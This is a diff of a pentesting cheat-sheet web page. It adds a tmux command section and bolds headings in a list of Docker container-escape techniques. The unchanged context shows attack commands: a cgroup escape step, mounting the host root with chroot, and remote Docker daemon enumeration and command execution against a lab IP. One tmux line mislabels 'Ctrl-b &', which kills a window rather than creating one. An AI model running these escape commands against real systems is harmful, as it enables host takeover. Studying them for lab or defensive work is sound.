@@ -98,6 +98,9 @@
     <p><a href="#ngrok">Ngrok</a></p>
   </li>
   <li>
+    <p><a href="#tmux">Tmux</a></p>
+  </li>
+  <li>
     <p><a href="#burp">Burp</a></p>
   </li>
   <li><a href="#web-pentest">Web Pentest</a>
@@ -197,7 +200,7 @@ docker load -i ./dockerImage.tar
 </code></pre></div></div>
 
 <h3>Vulnerability</h3>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#1: Privileged Containers (Capabilities)
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><b>#1: Privileged Containers (Capabilities)</b>
 - Enum:
 + Listing capabilities of a privileged Docker Container
     capsh --print
@@ -220,7 +223,7 @@ docker load -i ./dockerImage.tar
 
     8. sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 
-#2: Escaping via Exposed Docker Daemon
+<b>#2: Escaping via Exposed Docker Daemon</b>
 - Bref:
     + Sockets are used to move data between 2 places
     + Unix sockets also use file system permissions
@@ -232,7 +235,7 @@ docker load -i ./dockerImage.tar
 - Exploit:
     docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 
-#3: RCE via Exposed Docker Daemon
+<b>#3: RCE via Exposed Docker Daemon</b>
 - Enum: Finding Out if a Device Has Docker Remotely Accessible
     nmap -sV -p 2375 10.10.197.72
     curl http://10.10.197.72:2375/version
@@ -240,7 +243,7 @@ docker load -i ./dockerImage.tar
 - Exploit:
     docker -H tcp://10.10.197.72:2375 ps
 
-#4: Abusing Namespaces
+<b>#4: Abusing Namespaces</b>
 - Enum:
 ps aux
 USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
@@ -276,6 +279,40 @@ tunnels:
     addr: 8000
 #then start
 ngrok start -all
+</code></pre></div></div>
+
+<hr>
+
+<h2 id="tmux">Tmux</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><b># Create a new session:</b>
+tmux new-session -s session_name
+
+<b># List existing tmux sessions:</b>
+tmux list-sessions
+
+<b># Attach to a session:</b>
+tmux attach-session -t session_name
+
+<b># Detach from a session:</b>
+Inside the tmux session, press `Ctrl-b` followed by `d` to detach from the session.
+
+<b># Switch between sessions:</b>
+tmux switch-client -n (next session)
+tmux switch-client -l (previous session)
+
+<b># List windows in a session:</b>
+Inside the tmux session, press `Ctrl-b` followed by `w` to list all windows in the current session.
+
+<b># Create a new window:</b>
+Inside the tmux session, press `Ctrl-b` followed by `c` to create a new window.
+
+<b># Create the current window:</b>
+Inside the tmux session, press `Ctrl-b` followed by `&` to create a new window.
+
+<b># Rename a session:</b>
+tmux rename-session -t old_name new_name
+
 </code></pre></div></div>
 
 <hr>
